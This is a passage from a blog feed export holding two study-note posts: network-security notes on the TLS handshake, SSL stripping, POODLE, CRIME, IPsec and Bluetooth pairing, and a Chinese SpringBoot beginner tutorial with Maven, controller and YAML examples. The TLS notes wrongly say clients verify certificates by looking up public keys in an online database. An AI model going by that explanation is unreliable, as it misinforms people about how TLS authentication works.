<li><p>Both client and server use “client random”, “server random” and pre-master key to generate the same shared key using the same algorithm</p>
</li>
<li><p>Client is ready: client sends “finished” message which is encrypted by the shared key.</p>
</li>
<li><p>Server is ready: server sends “finished” message which is encrypted by the shared key.</p>
</li>
<li><p>Handshake is finished, server and client use symmetric crypto to communicate with each other.</p>
</li>
</ol>
<h2 id="How-SSL-TLS-protocol-prevent-attack"><a href="#How-SSL-TLS-protocol-prevent-attack" class="headerlink" title="How SSL/TLS protocol prevent attack"></a>How SSL/TLS protocol prevent attack</h2><h3 id="Scenario-1"><a href="#Scenario-1" class="headerlink" title="Scenario 1"></a>Scenario 1</h3><p>Attacker intercpet the message sending from the client to the server, direct it to themselves, and the attacker itself will send hello message to the client. Server will send its certificate to attacker and attacker will send this back to the client. </p>
<p><strong>Solution</strong></p>
<p>Eventhough the client verified the certificate, the attcker has no idea what the private key of the server, so he cannot decrypt the key transport and also cannot get the shared key generated later.</p>
<h3 id="Scenario-2"><a href="#Scenario-2" class="headerlink" title="Scenario 2"></a>Scenario 2</h3><p>Attacker sends client a fake certificate for google.com, will client uses the fake public key to generate a symmetric key?</p>
<p><strong>Solution</strong></p>
<p>After receiving the fake certificate, client would look up from the online public database for the public key of the certificate received to verify the certificate. Obviously, the certificate is fake and the website will then be labelled as not secure and the attack failed.</p>
<h2 id="Common-Attacks"><a href="#Common-Attacks" class="headerlink" title="Common Attacks"></a>Common Attacks</h2><h3 id="SSL-Stripping-Attack"><a href="#SSL-Stripping-Attack" class="headerlink" title="SSL Stripping Attack"></a>SSL Stripping Attack</h3><p>Attacker modifies web traffic to trick a client into accepting http connection instead of https </p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612172551.png" alt="SSL stripping attack"></p>
<p><strong>Countermeasure</strong></p>
<p>Server tells browser upon first visit to only accept HTTPS(not HTTP) for future requests to this domain.</p>
<h3 id="BEASAT-POODLE"><a href="#BEASAT-POODLE" class="headerlink" title="BEASAT/POODLE"></a>BEASAT/POODLE</h3><p>Browser Exploit Against SSL/TLS / Padding Oracle On Downgraded Legacy</p>
<ul>
<li>Attacker exploits Bugs in encryption/MAC mode of operation algorithm in TLS 1.0 to extract information on secret key.</li>
</ul>
<p><strong>Countermeasure</strong></p>
<p>Patches to TLS algorithms/implementations.</p>
<h3 id="Compression-ratio-info-leak-Made-Easy-CRIME"><a href="#Compression-ratio-info-leak-Made-Easy-CRIME" class="headerlink" title="Compression ratio info-leak Made Easy(CRIME)"></a>Compression ratio info-leak Made Easy(CRIME)</h3><p>TLS has a compress-then-encrypt mode; Compressed data length no hidden by encryption, reveals information to attacker on secret web site cookies. </p>
<p><strong>Countermeasure</strong></p>
<p>Disable TLS compression, avoid if possible record layer compression.</p>
<h1 id="IPsec-Protocol"><a href="#IPsec-Protocol" class="headerlink" title="IPsec Protocol"></a>IPsec Protocol</h1><h2 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h2><p><code>IPsec</code> stands for <strong>Internet Protocol Security</strong>, and is common used by VPN(<strong>Virtual Private Network</strong>).</p>
<h2 id="IPsec-methods"><a href="#IPsec-methods" class="headerlink" title="IPsec methods"></a>IPsec methods</h2><h3 id="AH-Authentication-Header"><a href="#AH-Authentication-Header" class="headerlink" title="AH - Authentication Header"></a>AH - Authentication Header</h3><p>AH can only authenticate data, and it cannot encrypt data. It adds an Authentication after the <strong>original IP header</strong>. AH authenticate the whole IP packet.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612204412.png" alt="authentication header"></p>
<p><strong>Security parameters index</strong>: point to entry corresponding to browser/server; includes info on shared key.</p>
<p><strong>Sequence Number</strong> is used for freshness vs replay attacks</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612204929.png" alt="AH example"></p>
<h3 id="ESP-Encapsulating-Security-Payload"><a href="#ESP-Encapsulating-Security-Payload" class="headerlink" title="ESP - Encapsulating Security Payload"></a>ESP - Encapsulating Security Payload</h3><p><strong>ESP supports both Authentication and Encryption.</strong> However, ESP does not encrypt and authenticate the IP header.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612205320.png" alt="ESP"></p>
<h2 id="Modes"><a href="#Modes" class="headerlink" title="Modes"></a>Modes</h2><ul>
<li><strong>Transport Mode</strong><ul>
<li>IP packet inserted with IPsec header(AH header/ESP header)</li>
</ul>
</li>
<li><strong>Tunnel Mode</strong><ul>
<li><strong>original packet preserved</strong> incl original header, new header added/prepended(at the begining of the whole packet)</li>
</ul>
</li>
</ul>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612205922.png" alt="modes"></p>
<h1 id="PAN"><a href="#PAN" class="headerlink" title="PAN"></a>PAN</h1><h2 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h2><p><code>PAN</code> stands for <strong>Personal Area Network</strong>. This technique is mainly used by Bluetooth. </p>
<p><strong>Bluetooth’s Secure Connections</strong></p>
<blockquote>
<p>leverage on <strong>human channel</strong> during pairing, e.g.</p>
<ul>
<li><p>compare passkey on both devices</p>
</li>
<li><p>see passkey on one, type into the other</p>
</li>
<li><p>type same passkey into both</p>
</li>
<li><p>which option, depends on device I/O capability </p>
</li>
</ul>
</blockquote>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>Monash Uni FIT2093</p>
<p><a href="https://blog.csdn.net/qq_38265137/article/details/89423551">https://blog.csdn.net/qq_38265137/article/details/89423551</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Cryptography</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot-基础入门笔记(1)</title>
    <url>/2021/07/16/SpringBoot-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/</url>
    <content><![CDATA[<h1 id="SpringBoot-基础入门笔记-1"><a href="#SpringBoot-基础入门笔记-1" class="headerlink" title="SpringBoot-基础入门笔记(1)"></a>SpringBoot-基础入门笔记(1)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>非常感谢<a href="https://space.bilibili.com/663528522">三根草堂</a>师父的<code>Spring Boot</code>系列教程，内容基本来源于<strong>三根草堂</strong>师父，也是学习边记录，希望通过学习能写出自己写出一个项目，且对<code>Javaweb</code>类的程序有一定了解，并能够入门<code>Java</code>安全代码审计。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="版本要求"><a href="#版本要求" class="headerlink" title="版本要求"></a>版本要求</h3><p>JDK : 8+<br>Maven ：3.5.x+</p>
<p>这里我选用<strong>2.5.2</strong>版本的<strong>Spring Boot</strong></p>
<h3 id="新建一个SpringBoot项目"><a href="#新建一个SpringBoot项目" class="headerlink" title="新建一个SpringBoot项目"></a>新建一个SpringBoot项目</h3><h4 id="方法一：Idea手动导入"><a href="#方法一：Idea手动导入" class="headerlink" title="方法一：Idea手动导入"></a>方法一：Idea手动导入</h4><p>创建一个空的Maven项目，在<code>File-Setting</code>中配置好Maven</p>
<span id="more"></span>

<p><img src="/image/SpringBoot-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/image-20210716232948699.png" alt="image-20210716232948699"></p>
<p><code>maven</code>和其仓库目录根据自己的情况修改。</p>
<p>创建好项目后，会自动生成一个<code>pom.xml</code>，</p>
<p><strong>再导入依赖</strong>：（相关说明在注解里）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Inherit defaults from Spring Boot--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span><span class="comment">&lt;!--这里SpringBootStarter帮我们集成了很多依赖，必须要继承--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span><span class="comment">&lt;!--这里的版本是根据你的Spring Boot版本来的--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Add typical dependencies for a web application--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span><span class="comment">&lt;!--这里是实现web功能的必须要的dependency，同样有很多依赖集成--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 可以使用mavin插件 可以用来打包等很多方便的操作--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里我们还需要配置下<code>Setting.xml</code>文件</p>
<p><img src="/image/SpringBoot-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/image-20210716233557981.png" alt="image-20210716233557981"></p>
<p>打开后在Setting标签下添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--下面是添加阿里云镜像，这样下载依赖更快，不过我在国外使用这个镜像反而无法下载，所以如果不适用直接注释掉就好了--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--下面是需要指定你的jdk版本，我的是1.8--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法二：-网站下载"><a href="#方法二：-网站下载" class="headerlink" title="方法二： 网站下载"></a>方法二： 网站下载</h4><p>通过<a href="https://start.spring.io/">Spring Initilizr</a>配置好下载就行了。</p>
<h4 id="方法三：通过IDEA新建（和方法二差不多）"><a href="#方法三：通过IDEA新建（和方法二差不多）" class="headerlink" title="方法三：通过IDEA新建（和方法二差不多）"></a>方法三：通过IDEA新建（和方法二差不多）</h4><p><img src="/image/SpringBoot-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/image-20210716234423763.png" alt="image-20210716234423763"></p>
<h3 id="Maven配置"><a href="#Maven配置" class="headerlink" title="Maven配置"></a>Maven配置</h3><p>有时候，如果我们依赖文件导入到一半中止，这时候会有一些错误，那么我们可以用一个清理Maven仓库的脚本, 修改一下仓库路径，然后保存为<code>.bat</code>文件，双击即可清理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">rem create by NettQun</span><br><span class="line">rem 这里写你的仓库路径</span><br><span class="line"><span class="built_in">set</span> REPOSITORY_PATH=E:\Develop\maven_rep</span><br><span class="line">rem 正在搜索...</span><br><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;delims=&quot;</span> %%i <span class="keyword">in</span> (<span class="string">&#x27;dir /b /s &quot;%REPOSITORY_PATH%\*lastUpdated*&quot;&#x27;</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> %%i</span><br><span class="line">del /s /q <span class="string">&quot;%%i&quot;</span></span><br><span class="line">)</span><br><span class="line">rem 搜索完毕</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<h2 id="一个简易的Hello-World"><a href="#一个简易的Hello-World" class="headerlink" title="一个简易的Hello World"></a>一个简易的Hello World</h2><h3 id="Application和Controller"><a href="#Application和Controller" class="headerlink" title="Application和Controller"></a>Application和Controller</h3><p><img src="/image/SpringBoot-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/image-20210716234550092.png" alt="image-20210716234550092"></p>
<p>在<code>src-main-java</code>下新建一个<code>package</code>，然后新建我们的<code>HelloApplication Class</code>，再新建一个<code>Controller package</code> 来存放我们的<code>Controller classes</code>,需要注意的是，<strong>我们的<code>Controller Class</code>必须放在<code>application class</code>的子目录里</strong>。注意，通过<code>Spring Initilizr</code>网站上直接下载的直接就有这些<code>class</code>了。</p>
<p><code>Application Class</code>的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(HelloApplication.class,args);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Controller</code>的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//@Controller</span></span><br><span class="line"><span class="comment">//@ResponseBody 结果返回到响应体，如果没有的话是会返回到新的页面</span></span><br><span class="line"><span class="meta">@RestController</span><span class="comment">//相当于Controller+responseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span><span class="comment">//this is to deal with the request of &quot;/hello&quot;</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RestController"><a href="#RestController" class="headerlink" title="RestController"></a>RestController</h3><p><code>Controller Class</code>需要加上<code>@Controller</code></p>
<p>如果要让数据返回到<code>response body</code>中<img src="/image/SpringBoot-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/image-20210716235326711.png" alt="image-20210716235326711">，需要使用<code>@ResponseBody</code></p>
<p><code>@RestController</code> 相当于 <code>@Controller+@ResponseBody</code>，所以我们也可以直接用这个代替</p>
<p><code>@RequestMapping</code>表示处理请求</p>
<h2 id="jar打包运行"><a href="#jar打包运行" class="headerlink" title="jar打包运行"></a>jar打包运行</h2><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><p><code>pom.xml</code>中加入以下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 可以使用mavin插件 可以用来打包 --&gt;</span><br><span class="line">&lt;build&gt;</span><br><span class="line">    &lt;plugins&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/plugins&gt;</span><br><span class="line"></span><br><span class="line">&lt;/build&gt;</span><br></pre></td></tr></table></figure>

<p>然后在Idea右侧的<code>Maven</code>中双击<code>package</code>即可</p>
<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>在<code>target</code>文件夹中可找到我们生成的<code>jar</code>文件，在当前文件所在目录的<code>cmd</code>中用<code>java -jar filename</code>运行起来即可</p>
<h2 id="版本锁定"><a href="#版本锁定" class="headerlink" title="版本锁定"></a>版本锁定</h2><p>Spring Boot所继承的<code>spring-boot-starter-parent</code>这个副工程为我们对常用的依赖进行了版本锁定(在父工程的<code>pom.xml</code>文件中)。</p>
<p>我们可以通过直接指定版本号（在我们的<code>pom.xml</code>）和覆盖<code>properties</code>配置来修改依赖的版本(在父工程的<code>pom.xml</code>文件中)。。</p>
<h2 id="Starter机制"><a href="#Starter机制" class="headerlink" title="Starter机制"></a>Starter机制</h2><p>一个starter针对一种特定的场景，内部引用了该场景所需要的依赖，所以我们不需要单独引入多个依赖。</p>
<blockquote>
<p>命名规律<br>官方starter都是以 spring-boot-starter 开头后面跟上场景名称。例如：spring-boot-starterdata-jpa<br>非官方starter则是以 场景名-spring-boot-starter 的格式，例如：mybatis-spring-boot-starter</p>
</blockquote>
<p><strong>非官方</strong>的starter是不会被<code>Spring Boot</code>的父工程进行版本指定的，所以我们需要指定<code>version</code></p>
<h2 id="YAML文件配置（重要）"><a href="#YAML文件配置（重要）" class="headerlink" title="YAML文件配置（重要）"></a>YAML文件配置（重要）</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>YAML是以<code>yml</code>为后缀的文件，用来完成XML所完成的任务，易于阅读且简单明了。<code>yaml</code>文件应该放在<code>resources</code>文件夹中，如<code>application.yml</code></p>
<h3 id="约定"><a href="#约定" class="headerlink" title="约定"></a>约定</h3><ul>
<li><p><code>key: value</code>冒号后面必须有一个空格</p>
</li>
<li><p>用空格的缩进表示层级关系，<strong>空格数目不重要，只要是左对齐的一列数据，都是同一个层级的</strong></p>
</li>
<li><p>缩进时不允许使用<code>TAB</code>键，只允许用<strong>空格</strong></p>
</li>
<li><p>命名时，<code>lastName和last-name都可以</code></p>
</li>
</ul>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name1:</span> <span class="string">sangeng//可以不用引号</span></span><br><span class="line"><span class="comment">#单引号中\n不起作用</span></span><br><span class="line"><span class="attr">name2:</span> <span class="string">&#x27;sangeng \n caotang&#x27;</span></span><br><span class="line"><span class="comment">#双引号中\n要起作用</span></span><br><span class="line"><span class="attr">name3:</span> <span class="string">&quot;sangeng \n caotang&quot;</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">15</span></span><br><span class="line"><span class="attr">flag:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2021</span><span class="string">/07/16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#object的attribute和value,也可代表Map：</span></span><br><span class="line"><span class="attr">student:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">leihehe</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">21</span></span><br><span class="line"><span class="comment">#如果要写成一行，如下:</span></span><br><span class="line"><span class="attr">student:</span> &#123;<span class="attr">name:</span> <span class="string">leihehe</span>,<span class="attr">age:</span> <span class="number">21</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#数组、list、set:</span></span><br><span class="line"><span class="attr">pets:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">dog</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pig</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cat</span></span><br><span class="line"><span class="comment">#list如果要写成一行，如下：</span></span><br><span class="line"><span class="attr">pets:</span> &#123;<span class="string">dog</span>,<span class="string">pig</span>,<span class="string">cat</span>&#125;</span><br><span class="line"><span class="comment">#数组写成一行，如下：</span></span><br><span class="line"><span class="attr">pets:</span> [<span class="string">dog</span>,<span class="string">pig</span>,<span class="string">cat</span>]</span><br><span class="line"><span class="comment">#修改服务器端口,如果myPort没有被设置，就会被设为88</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">	<span class="attr">port:</span> <span class="string">$&#123;myPort:88&#125;</span></span><br><span class="line"><span class="attr">myPort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>

<h3 id="Spring-Boot读取YML"><a href="#Spring-Boot读取YML" class="headerlink" title="Spring Boot读取YML"></a>Spring Boot读取YML</h3><h4 id="Value注解"><a href="#Value注解" class="headerlink" title="@Value注解"></a>@Value注解</h4><p>该注解只能获取简单类型的值（8种基本数据类型以及其包装类，String，Date）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;name&#125;&quot;)</span><span class="comment">//此处从yaml文件中读取到name的值，并赋值给下面的变量</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;student.age&#125;&quot;)</span><span class="comment">//从student这个object中获取age的值，并赋值给下面的变量</span></span><br><span class="line">	<span class="keyword">private</span> String age;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/age&quot;)</span><span class="comment">//处理/age访问请求</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">age</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span><span class="comment">//处理/test访问请求</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;<span class="comment">//返回name</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>加了<code>@Value</code>的Class必须要交由Spring容器管理，如此处的<code>@RestController</code></strong></p>
<h4 id="ConfigurationProperties-注解-与Lombok插件"><a href="#ConfigurationProperties-注解-与Lombok插件" class="headerlink" title="@ConfigurationProperties 注解 与Lombok插件"></a>@ConfigurationProperties 注解 与Lombok插件</h4><p><strong>使用<code>@ConfigurationProperties</code>的Class必须要交由Spring容器管理。</strong></p>
<p><code>yml</code>文件中：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">student2:</span> &#123;<span class="attr">name:</span> <span class="string">jack</span>,<span class="attr">age:</span> <span class="number">21</span>&#125;</span><br></pre></td></tr></table></figure>

<p><code>Student Class</code>中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span><span class="comment">//根据我们的attribute帮我们生成set/get方法</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span><span class="comment">//生成空参constructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span><span class="comment">//生成传参constructor</span></span><br><span class="line"><span class="comment">//以上都是Lombok插件的作用</span></span><br><span class="line"><span class="meta">@Component</span><span class="comment">//把该类交给Spring容器管理</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;student2&quot;)</span><span class="comment">//设置前缀</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;<span class="comment">//此处的attribute必须和yaml file里的key名字一样才可以赋值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"><span class="comment">//attribute会自动被赋值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>要求对应的属性要有set/get方法</strong>，而此处我们用<code>Lombok</code>这个依赖帮我们自动完成这件事，所以我们不需要手动生成<code>set/get</code>方法</p>
<p>当然，我们还需要<strong>安装Lombok 插件</strong>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>HelloController</code>中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span><span class="comment">//因为创建Student类的instance，所以用autowired可以自动注入，从Spring容器中获取数据,赋值给下面的变量</span></span><br><span class="line"><span class="keyword">private</span> Student student;</span><br></pre></td></tr></table></figure>

<h4 id="ConfigurationProperties-配置提示"><a href="#ConfigurationProperties-配置提示" class="headerlink" title="@ConfigurationProperties 配置提示"></a>@ConfigurationProperties 配置提示</h4><p>另外，如果我们使用了<code>@ConfigurationProperties</code>注解，我们可以增加如下依赖，这样在写配置的时候会有提示</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>重启idea即可</strong></p>
<h3 id="YML和Properties转换"><a href="#YML和Properties转换" class="headerlink" title="YML和Properties转换"></a>YML和Properties转换</h3><p><code>application.yml</code>需要改成<code>application.properties</code></p>
<p><a href="https://www.toyaml.com/index.html">在线yaml转properties</a></p>
<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><h3 id="依赖冲突"><a href="#依赖冲突" class="headerlink" title="依赖冲突"></a>依赖冲突</h3><h4 id="造成原因"><a href="#造成原因" class="headerlink" title="造成原因"></a>造成原因</h4><blockquote>
<p>A依赖B（低版本）</p>
<p>C依赖B（高版本）</p>
</blockquote>
<p>若你先引入A，那么低版本的B会被引入，再引入C后，C就找不到高版本的B，就会出现依赖冲突</p>
